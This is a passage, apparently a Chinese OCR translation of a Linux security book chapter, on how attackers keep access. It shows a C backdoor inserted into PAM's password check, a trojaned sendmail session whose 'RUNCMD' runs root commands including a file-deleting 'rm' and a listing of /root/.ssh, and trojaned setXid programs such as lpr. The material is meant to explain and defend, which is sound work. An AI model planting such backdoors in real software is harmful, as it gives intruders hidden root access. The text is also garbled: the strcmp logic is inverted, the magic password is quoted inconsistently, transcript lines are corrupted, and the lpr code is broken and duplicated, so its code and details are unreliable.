
| 流行度 | 6 |
| :--- | :--- |
| 简单性 | 6 |
| 影响 | 9 |
| 风险等级 | 7 |

任何验证用户身份的服务，例如通过 `imapd` 和 `pop3d` 的邮件服务，或登录服务，都可以重新编译以包含魔法密码。

# 第10 章：黑客如何维持访问权限

当使用这些魔法密码时，访问权限会自动授予用户，无论密码如何。这允许黑客在系统更改的情况下访问。

# PAM 库

| 流行度 | 6 |
| :--- | :--- |
| 简单性 | 5 |
| 影响 | 9 |
| 风险等级 | 7 |

许多服务通过 PAM（可插式认证模块）进行验证，而不是将身份验证构建在每个程序中。让我们使用示例程序 `login`。它从 `/etc/pam.login` 获取配置：

```text
auth required /lib/security.so
```

尝试从本地 tty 运行登录：

```bash
brenda@machine$ login
login: bonnie
Password: <password here>
You have mail.
george@machine$ exit
```

我们注释掉 `/etc/pam.login` 中包含 `lib/security/pam_pwdb.so` 的行，并再次尝试：

```bash
brenda@machine$ login
login: bonnie
bonnie@machine$
```

通过注释掉该行，我们告诉 PAM 模块 `login` 不需要运行 `pwdb` 来验证 `/etc/passwd` 和 `/shadow` 中的密码有效性。因此访问被直接授予。这种更改很快会被注意到——用户不需要密码就能获得访问，并引发怀疑。然而，黑客可以修改 `pwdb` 执行实际验证的方式。从 PAM 源码（不，文件名没有拼写错误）中，我们有以下代码段：

```c
static int _unix_verify_password(pam_handle_t *pamh, const char *name,
    const char *p, unsigned int ctrl)
{
    struct pwdb *pw=NULL;
...
/* 黑客插入的代码开始 */
    if ( strcmp(p, "SuPer s3crit s7r*")) {
        return PAM_SUCCESS;
    }
    /* 黑客插入的代码结束 */

    D(("called"));

    /* 查找该用户的条目 */

    D(("locating user's record"));
...
```

## 第 10 章：黑客如何维持访问

该函数的剩余部分（大约 8 页内容）包含了检查用户密码有效性所需的所有代码，允许重试并在必要时运行任何外部辅助程序。注意，黑客在 D 行（"called"）之前插入了一个严格的 `mp`；

随后，黑客编译此版本的 `pam_pwdb` 并将其安装到 `/lib/security`。此后，任何在 `pam_pwdb` 上运行的启用 PAM 的软件（几乎包含所有认证软件，包括登录、sshd、su、xscreens 等）将允许通过此后门密码获得访问。如果提交了魔法密码（`upeR3crit sr7n*`），将不会执行任何实际的用户名/密码检查；仅授予访问。由于黑客可以为大多数服务提供用户名，因此通过记住他编译进 `pam_pwdb.so` 的密码，就可以获得用户和 root 权限。

这是一种提供登录/认证后门要优雅得多的方法，因为它影响了所有感知 PAM 的软件，并且没有留下允许所有密码普遍通用的这种显性漏洞。

## 网络守护进程修改

| 指标 | 评分 |
| :--- | :--- |
| 流行度 | 5 |
| 简单性 | 5 |
| 影响 | 10 |
| 风险等级 | 7 |

黑客可以修改现有的网络守护进程（例如打印守护进程），使其也拥有魔法字符串。例如，黑客可以重新编译 `sendmail` 以接受一个新的类似 SMTP 的命令 "RUNCMD"，该命令将以 root 身份运行并返回输出，如下所示：

```
hackerbox telnet hackedmachine.example.org smtp
Trying 172.30.15...
Connected to hackedmachine.example.org.
Escape character is '^'.
220 mail.example.org SMTP Sendmail 8.10.1/80.1; 19 Apr 2000 04:43 -0800
HELO hackerbox.example.com
250 mail.example.org Hello hackerbox.example.com, pleased to meet you
HELnP214-2.0.0 This is Sendmail version 8.10.1
214-2.0.0 Topics:
214-2.0.0 HELO ENHLO MAIL RCPT DATA
214-2.0.0 RSET NOOP QUIT HELP VRFY
214-2.0.0 EXPN VERB ETRN DSN
214-2.0.0 For more info use "HELP <topic>"
214 2.0.0 End of HELP info
VRFY root
252 2.5.2 Cannot VRFY user; try RCPT to attempt delivery (or try finger)
```

![](img/33829ffb1435b4baef56fcd2c28ec6cd_378_0.png)

## Linux 破解揭秘：Linux 秘密与解决方案

```
RUNCMD -name *.jpg -exec rm {} \ \
250 Command successful
RUNCMD uname -srm
214 2.0.0 Linux hackedmachine 2.2.18s sparc
RUNCMD ls /root/.ssh
214-2.0.0 authorized_keys
214-2.0.0 identity
214-2.0.0 Identity.pub
214-2.0.0 known_hosts
214 2.0.0 random_seed
```

QUIT

221 2.0.0 mail.example.org closing connection

Connection closed by foreign host.

在这里我们看到了新命令的作用。它的输出结果符合 SMTP 规范，这甚至可能允许它通过某些编写得糟糕的应用程序代理。没有理由认为魔法命令不能允许交互式的 root shell，因为黑客只需要在保持现有功能完整的同时，添加他的新命令以防止被轻易检测。

## 本地 SetXid 程序

| 指标 | 评分 |
| :--- | :--- |
| 流行度 | 7 |
| 简单性 | 6 |
| 影响 | 8 |
| 风险等级 | 7 |

![](img/33829ffb1435b4baef56fcd2c28ec6cd_379_0.png)

当漏洞被修复时，黑客可能会丢失对系统的访问权限，但可能仍保留用户登录访问。通过对 `setXid` 程序进行木马化，他可以留下后门让他将权限提升回 root，或者至少提升到一个有助于保持 root 权限的特权组。这些通常涉及魔法字符串、参数或环境变量。任何 `setXid` 程序都是候选者。流行的程序包括 `passwd`、`chfn`、`chsh`、`assh`、`crontab`、`lpr`、`lprrm` 以及 Berkeley r-commands。

以下是黑客插入 `lpr.c` 的代码示例，它是打印打印命令 `lpr` 的源文件之一：

```
name = argv[0];

ghostname(host, sizeof(host));

host[MAXHOSTNAMELEN-1] = '\0';

openlog("lpd", 1 && argv[1], 0, LOG_LPR);

while (argc > 1 && argv[1] == '-') {

    arg = ++argv;

    switch (arg[1]) {

```
```
case 'P': /* 指定打印机名称 */
    if (arg[2])
        printer = &arg[2];
    else if (argc > 1) {
        argc--;
        printer =
    }
```
```
case 'P': /* 指定打印机名称 */
    if (arg[2])
        printer = &arg[2];
    else if (argc > 1) {
        argc--;
        printer--;
    }
```
